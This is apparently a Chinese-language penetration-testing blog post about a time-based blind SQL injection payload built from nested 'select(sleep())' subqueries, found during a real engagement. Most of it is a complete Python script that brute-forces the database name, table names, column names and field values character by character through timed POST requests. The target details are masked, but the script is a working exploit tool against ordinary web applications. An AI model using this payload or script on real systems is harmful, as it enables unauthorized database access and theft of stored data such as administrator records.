---
title: 记一次实战渗透sql时间注入payload利用(select(0)from(select(sleep(6)))v)
date: 2021-09-11 22:11:17
tags: 
     - web学习 
categories:
     - web学习 
     - 学习

cover: image-20210916160910664.png
index_img: image-20210916160910664.png

---

# 记一次实战sql时间注入payload利用(select(0)from(select(sleep(6)))v)



### 0x01 前言

​		某次渗透，又遇到了一个AWVS的payload是 **(select(0)from(select(sleep(6)))v)/\*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"\*/**，使用SQLmap还是不能直接跑出来，不过我确实还没见过这种时间盲注的payload。

<img src="image-20210916160910664.png" alt="image-20210916160910664" style="zoom:67%;" />

​	百度一下发现这也是个时间盲注的payload，链接[(3条消息) CVE-2015-3934 sql盲注payload_qq_26317875的博客-CSDN博客](https://blog.csdn.net/qq_26317875/article/details/79949625)

不过我也很好奇为啥一定是3个 **(select(0)from(select(sleep(6)))v)**加上一堆过滤符号才能够注入.

![image-20210917201450604](image-20210917201450604.png)

自己尝试了一下**/*'+(select(0)from(select(payload,sleep(5),0)))v)+'"+(select(0)from(select(payload,sleep(5),0)))v)+"*/** 和**'"+(select(0)from(select(payload,sleep(5),0)))v)+"*/**这样的payload，都不行，还是有点搞不懂。

<img src="image-20210917213017578111.png" alt="image-20210917213017578" style="zoom: 80%;" />



### 0x02 payload

​		根据上文提到的文章，**(select(0)from(select(sleep(6)))v)**这样的payload可以解释为select嵌套查询，v为第二个select的别名，总结就是在第二个select子查询中时间盲注。

​		使用方式就是使用时间盲注放入第二个子查询中的select当中即可，形式为**(select(0)from(select(payload,sleep(5),0)))v)**，利用sleep()进行时间盲注。

​		测试了一下，如果要使用这个payload，需要3个select都修改，利用形式为：

```bash
(select(0)from(select(payload,sleep(5),0)))v)/'+(select(0)from(select(payload},sleep(5),0)))v)+'"+(select(0)from(select(payload,sleep(5),0)))v)+"/
```

成功进行利用：

![image-20210917214553352](image-20210917214553352.png)

### 0x03 python脚本（完整版）

​		修改自之前的脚本，全部函数写到一起，方便利用，优化了一些爆破的地方，也方便改为其他的payload，虽然没有利用二分减少判断时间，当时方便就好。

```python
import requests
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning,InsecurePlatformWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
value ="0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!"
result=""



def get_data_len():
    for i in range(0,30):
        time.sleep(1)
        headers = {

                'Connection': '***',
                'X-Requested-With': '***',
                'Host': '***',
                'Content-Length': '***',
                'Content-Type': '***',
                'User-Agent': '***',
                'Accept': '***',
                'Referer': '***',
                'Accept-Encoding': '***',
                'Accept-Language': '***',
                'Cookie': '***',

                }
        newr="""(select(0)from(select(IF(length(database())={0},sleep(5),0)))v)/*'+(select(0)from(select(IF(length(database())={0},sleep(5),0)))v)+'"+(select(0)from(select(IF(length(database())={0},sleep(5),0)))v)+"*/""".format(i)
        #newr="""(select(0)from(select(sleep(9)))v)/*'+(select(0)from(select(sleep(9)))v)+'"+(select(0)from(select(sleep(9)))v)+"*/"""
        print (newr)
        payload = newr
        url = "***"
        data = {"******": *** }
        print (data)
        start_time = time.time()
        html = requests.post(url, data=data,headers=headers, verify=False, allow_redirects=False)
        end_time = time.time()
        use_time = end_time - start_time #求出请求前后的时间差来判断是否延时了
        print (str(use_time))
        if use_time > 3:
            print("...... data's length is :"+ str(i)) 
            return i  


def get_data(length):
    global result
    headers = {

        'Connection': '***',
        'X-Requested-With': '***',
        'Host': '***',
        'Content-Length': '***',
        'Content-Type': '***',
        'User-Agent': '***',
        'Accept': '***',
        'Referer': '***',
        'Accept-Encoding': '***',
        'Accept-Language': '***',
        'Cookie': '***',

    }
    url = "****"
    for n in range(1,length):
        for v in value:
            time.sleep(1)
            data_payload="database()"
            #payload = "if(ascii(substr({0},{1},1))={2},sleep(0.1),0)".format(data_payload,n,ord(v))
            newr="""(select(0)from(select(IF(ascii(substr({0},{1},1))={2},sleep(5),0)))v)/*'+(select(0)from(select(IF(ascii(substr({0},{1},1))={2},sleep(5),0)))v)+'"+(select(0)from(select(IF(ascii(substr({0},{1},1))={2},sleep(5),0)))v)+"*/""".format(data_payload,n,ord(v))
            #newr="""(select(0)from(select(sleep(9)))v)/*'+(select(0)from(select(sleep(9)))v)+'"+(select(0)from(select(sleep(9)))v)+"*/"""
            print (newr)
            payload = newr            
            #print (str(payload))
            data = {"*": *}
            print (data)
            start_time = time.time()
            html = requests.post(url, data=data,headers=headers, verify=False, allow_redirects=False)
            end_time = time.time()
            use_time = end_time - start_time
            print (str(use_time))
            if use_time >4:
                result += v
                print("数据库名："+result)
                break
    return result

def get_biao_data(length,table_num): 
    #global result
    headers = {

        'Connection': '***',
        'X-Requested-With': '***',
        'Host': '***',
        'Content-Length': '***',
        'Content-Type': '***',
        'User-Agent': '***',
        'Accept': '***',
        'Referer': '***',
        'Accept-Encoding': '***',
        'Accept-Language': '***',
        'Cookie': '***',

    }

    url = "**"
    table_name_new=""
    biao_flag=0
    for n in range(1,length):
        
        for v in value:
            #time.sleep(1)
            biao_flag=0

            data_payload="(select table_name from information_schema.tables where table_schema=database() limit {0},1)".format(table_num) #第几个表名
            payload = """(select(0)from(select(IF(ascii(substr({0},{1},1))={2},sleep(5),0)))v)/*'+(select(0)from(select(IF(ascii(substr({0},{1},1))={2},sleep(5),0)))v)+'"+(select(0)from(select(IF(ascii(substr({0},{1},1))={2},sleep(5),0)))v)+"*/""".format(data_payload,n,ord(v))
            #payload = "if(ascii(substr({0},{1},1))={2},sleep(0.1),0)".format(data_payload,n,ord(v))
            print ("test:"+str(payload))
            data = {"***": ***}
            start_time = time.time()
            html = requests.post(url, data=data,headers=headers, verify=False, allow_redirects=False)
            end_time = time.time()
            use_time = end_time - start_time
            if use_time >4:
                table_name_new += v
                print("第 "+str(table_num)+" 个表名:"+table_name_new)
                biao_flag=1
                break
        if biao_flag==0:
            return table_name_new
    return table_name_new

def get_data_lie(length,table_num,lie_num): #盲注爆列
    #global result
    headers = {

        'Connection': '***',
        'X-Requested-With': '***',
        'Host': '***',
        'Content-Length': '***',
        'Content-Type': '***',
        'User-Agent': '***',
        'Accept': '***',
        'Referer': '***',
        'Accept-Encoding': '***',
        'Accept-Language': '***',
        'Cookie': '***',

    }

    url = "****"
    lie_name_new=""
    flag_lie = 0
    for n in range(1,length):
        
        for v in value:
            flag_lie = 0

            data_payload="(select table_name from information_schema.tables where table_schema=database() limit {0},1)".format(table_num)
            #爆列ascii(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() limit 13,1) limit 0,1),1,1))=105
            lie_payload="(select column_name from information_schema.columns where table_name={0} limit {1},1)".format(data_payload,lie_num)
            #payload = "if(ascii(substr({0},{1},1))={2},sleep(0.1),0)".format(data_payload,n,ord(v))
            payload = """(select(0)from(select(IF(ascii(substr({0},{1},1))={2},sleep(5),0)))v)/*'+(select(0)from(select(IF(ascii(substr({0},{1},1))={2},sleep(5),0)))v)+'"+(select(0)from(select(IF(ascii(substr({0},{1},1))={2},sleep(5),0)))v)+"*/""".format(lie_payload,n,ord(v))

            #payload = "if(ascii(substr({0},{1},1))={2},sleep(0.1),0)".format(lie_payload,n,ord(v))
            print ("test:"+str(payload))
            data = {"***": ***}
            start_time = time.time()
            html = requests.post(url, data=data,headers=headers, verify=False, allow_redirects=False)
            end_time = time.time()
            use_time = end_time - start_time
            print (use_time)
            if use_time >4:
                lie_name_new += v
                print("第 "+str(table_num)+" 个表名的第"+str(lie_num)+"列名:"+str(lie_name_new)+'\n')
                flag_lie = 1
                break
        
        if (flag_lie==0):
            print ("1")
            return lie_name_new
        
    return lie_name_new




def get_data_ziduan(length,ziduan_num,tablet_name_set,lie_name_set):
    #global result
    headers = {

        'Connection': '***',
        'X-Requested-With': '***',
        'Host': '***',
        'Content-Length': '***',
        'Content-Type': '***',
        'User-Agent': '***',
        'Accept': '***',
        'Referer': '***',
        'Accept-Encoding': '***',
        'Accept-Language': '***',
        'Cookie': '***',

    }

    url = "****"
    ziduan_name_new=""
    ziduan_flag=0
    for n in range(1,length):
        
        for v in value:
            ziduan_flag=0

            data_payload="(select {0} from {1} limit {2},1)".format(lie_name_set,tablet_name_set,ziduan_num)
            payload = """(select(0)from(select(IF(ascii(substr({0},{1},1))={2},sleep(5),0)))v)/*'+(select(0)from(select(IF(ascii(substr({0},{1},1))={2},sleep(5),0)))v)+'"+(select(0)from(select(IF(ascii(substr({0},{1},1))={2},sleep(5),0)))v)+"*/""".format(data_payload,n,ord(v))
           
            #if(ascii(substr((select email from ecs_admin_user limit 0,1),1,1))<68,sleep(0.1),0)
            
            #payload = "if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<117,sleep(0.1),0)".format(data_payload,n,ord(v))
            #payload = "if(ascii(substr({0},{1},1))={2},sleep(0.1),0)".format(data_payload,n,ord(v))
            print ("test:"+str(payload))
            data = {"***": **}
            start_time = time.time()
            html = requests.post(url, data=data,headers=headers, verify=False, allow_redirects=False)
            end_time = time.time()
            use_time = end_time - start_time
            if use_time >4:
                ziduan_name_new += v
                ziduan_flag=1

                print("表"+tablet_name_set+"的列"+lie_name_set+"的第 "+str(ziduan_num)+" 个字段:"+str(ziduan_name_new)+'\n')
                break

        if (ziduan_flag==0):
            print ("1")
            return ziduan_name_new

    return ziduan_name_new

#爆数据库
#len=get_data_len()
#data_name=get_data(11)
#f=open('result.txt','a',encoding='utf-8')
#f.write("数据库名字："+str(database_name))

'''
for table_num in range(0,20): #爆20个表
    tablet_name=get_biao_data(20,table_num)
    f=open('result_table.txt','a',encoding='utf-8')
    f.write("第 "+str(table_num)+" 个表名:"+str(tablet_name)+'\n')
    f.close()
'''

'''
#爆列
table_num=7
for lie_num in range(0,10):
    lie_name=get_data_lie(20,table_num,lie_num)
    f=open('result_table_lie.txt','a',encoding='utf-8')
    f.write("第 "+str(table_num)+" 个表名的第"+str(lie_num)+"列名:"+str(lie_name)+'\n')
    f.close()
'''

#爆字段
tablet_name_set="***"
lie_name_set="****"
for ziduan_num in range(0,10):
    ziduan_name=get_data_ziduan(35,ziduan_num,tablet_name_set,lie_name_set)
    f=open('result_table_lie_ziduan.txt','a',encoding='utf-8')
    f.write("表"+tablet_name_set+"的列"+lie_name_set+"的第 "+str(ziduan_num)+" 个字段:"+str(ziduan_name)+'\n')
    f.close()


```



